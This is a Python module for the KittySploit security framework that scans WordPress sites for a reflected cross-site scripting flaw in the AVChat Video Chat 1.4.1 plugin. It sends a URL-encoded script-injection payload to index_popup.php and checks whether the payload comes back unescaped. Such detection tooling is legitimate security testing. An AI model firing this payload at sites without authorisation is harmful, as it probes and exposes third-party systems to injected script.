#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress AVChat Video Chat 1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress AVChat Video Chat 1.4.1 - Cross-Site Scripting Detection',
        'description': 'WordPress AVChat Video Chat 1.4.1 is vulnerable to reflected cross-site scripting via index_popup.php and multiple parameters.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'vulnerability', 'xss', 'wp', 'wpscan', 'wordpress', 'wp-plugin', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://codevigilant.com/disclosure/wp-plugin-avchat-3-a3-cross-site-scripting-xss/',
            'https://wpscan.com/vulnerability/fce99c82-3958-4c17-88d3-6e8fa1a11e59',
        ],
    }

    def run(self):
        r = self.http_request(method="GET", path='/wp-content/plugins/avchat-3/index_popup.php?movie_param=%3C/script%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&FB_appId=FB_appId%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('value="FB_appId"><script>alert(document.domain)</script>"',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="WordPress AVChat Video Chat 1.4.1 - Cross-Site Scripting detected",
                path='/wp-content/plugins/avchat-3/index_popup.php?movie_param=%3C/script%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&FB_appId=FB_appId%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&',
            )
            return True
        return False

